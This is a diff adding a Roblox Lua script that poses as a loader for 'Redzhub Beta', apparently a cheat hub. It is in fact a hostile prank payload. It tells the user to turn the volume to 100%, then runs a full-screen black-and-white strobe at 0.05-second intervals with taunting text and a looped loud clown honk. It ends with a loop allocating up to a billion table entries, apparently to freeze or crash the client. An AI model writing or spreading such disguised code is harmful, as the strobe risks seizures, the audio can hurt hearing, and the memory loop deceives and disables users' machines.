@@ -1,0 +1,122 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a TextLabel for the timer
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.5, 0, 0.15, 0)  -- Make it bigger to fit the volume message
+textLabel.Position = UDim2.new(0.25, 0, 0.4, 0)
+textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextScaled = true
+textLabel.Text = "Please wait 20 seconds...\nPlease turn your volume to 50% or 100% to make sure it's working (100% is recommended)"
+textLabel.Parent = screenGui
+
+-- Create a TextLabel for the Redzhub Beta name (during the loading phase)
+local redzhubText = Instance.new("TextLabel")
+redzhubText.Size = UDim2.new(0.5, 0, 0.1, 0)  -- Professional looking size
+redzhubText.Position = UDim2.new(0.25, 0, 0.2, 0)  -- Just above the timer
+redzhubText.BackgroundTransparency = 1
+redzhubText.TextColor3 = Color3.new(1, 0, 0)  -- Red text
+redzhubText.Font = Enum.Font.GothamBold  -- Professional font
+redzhubText.TextScaled = true
+redzhubText.Text = "Redzhub Beta"
+redzhubText.Parent = screenGui
+
+-- Proper 20-second timer
+spawn(function()
+    for i = 20, 1, -1 do
+        textLabel.Text = "Please wait " .. tostring(i) .. " seconds...\nPlease turn your volume to 50% or 100% to make sure it's working (100% is recommended)"
+        wait(1)
+    end
+end)
+
+-- Wait 20 seconds
+wait(20)
+
+-- Remove the timer and the Redzhub Beta label
+textLabel:Destroy()
+redzhubText:Destroy()
+
+-- Create a flashing screen with a clown emoji and text
+spawn(function()
+    local flashFrame = Instance.new("Frame")
+    flashFrame.Size = UDim2.new(1, 0, 1, 0) -- Full screen
+    flashFrame.Position = UDim2.new(0, 0, 0, 0)
+    flashFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    flashFrame.ZIndex = 10 -- Flashing frame is on the 3rd layer
+    flashFrame.Parent = screenGui
+
+    -- Create a label for "🤡 Imagine Hacking" on the top (ZIndex = 11)
+    local clownText = Instance.new("TextLabel")
+    clownText.Size = UDim2.new(0.8, 0, 0.2, 0)
+    clownText.Position = UDim2.new(0.1, 0, 0.05, 0)  -- Top of the screen
+    clownText.BackgroundTransparency = 1
+    clownText.TextColor3 = Color3.new(1, 1, 1)
+    clownText.Font = Enum.Font.SourceSansBold
+    clownText.TextScaled = true
+    clownText.Text = "🤡 Imagine Hacking"
+    clownText.ZIndex = 11 -- Text is on the first layer (ZIndex = 11)
+    clownText.Parent = screenGui
+
+    -- Create a label for "Made by JX2" on the first layer
+    local creditText = Instance.new("TextLabel")
+    creditText.Size = UDim2.new(0.3, 0, 0.05, 0)
+    creditText.Position = UDim2.new(0.35, 0, 0.9, 0)
+    creditText.BackgroundTransparency = 1
+    creditText.TextColor3 = Color3.new(1, 1, 1)
+    creditText.Font = Enum.Font.SourceSansBold
+    creditText.TextScaled = true
+    creditText.Text = "Made by JX2"
+    creditText.ZIndex = 11 -- Text is on the first layer (ZIndex = 11)
+    creditText.Parent = flashFrame
+
+    -- Create a label for "Are you really that lazy to do it yourself? Pathetic." in the middle
+    local lazyText = Instance.new("TextLabel")
+    lazyText.Size = UDim2.new(0.8, 0, 0.2, 0)
+    lazyText.Position = UDim2.new(0.1, 0, 0.4, 0)  -- Middle of the screen
+    lazyText.BackgroundTransparency = 1
+    lazyText.TextColor3 = Color3.new(1, 0, 0)  -- Red color for emphasis
+    lazyText.Font = Enum.Font.SourceSansBold
+    lazyText.TextScaled = true
+    lazyText.Text = "Are you really that lazy to do it yourself? Pathetic."
+    lazyText.ZIndex = 11
+    lazyText.Parent = flashFrame
+
+    -- Infinite flashing loop
+    while true do
+        flashFrame.BackgroundColor3 = Color3.new(1, 1, 1) -- White
+        clownText.TextColor3 = Color3.new(0, 0, 0) -- Black text during white flash
+        creditText.TextColor3 = Color3.new(0, 0, 0)
+        lazyText.TextColor3 = Color3.new(0, 0, 0)  -- Black text during white flash
+        wait(0.05) -- Flash interval
+        flashFrame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black
+        clownText.TextColor3 = Color3.new(1, 1, 1) -- White text during black flash
+        creditText.TextColor3 = Color3.new(1, 1, 1)
+        lazyText.TextColor3 = Color3.new(1, 1, 1)  -- White text during black flash
+        wait(0.05)
+    end
+end)
+
+-- Play the clown honk sound immediately after flashing effect
+spawn(function()
+    -- Play the clown honk sound
+    local clownHonkSound = Instance.new("Sound")
+    clownHonkSound.SoundId = "rbxassetid://3722232094"  -- Clown honk sound asset ID
+    clownHonkSound.Looped = true  -- Make the sound loop
+    clownHonkSound.Volume = 10  -- Increase volume to make it louder
+    clownHonkSound.Parent = game.Workspace  -- Parent it to Workspace or the player if desired
+    clownHonkSound:Play()  -- Play the sound
+end)
+
+-- Wait for 1.5 seconds after flashing
+wait(1.5)
+
+-- Start creating tables in an infinite loop immediately after flashing
+spawn(function()
+    local table = {}
+    for i = 1, 1000000000 do  -- Loop up to 1 billion
+        table[i] = i
+    end
+end)
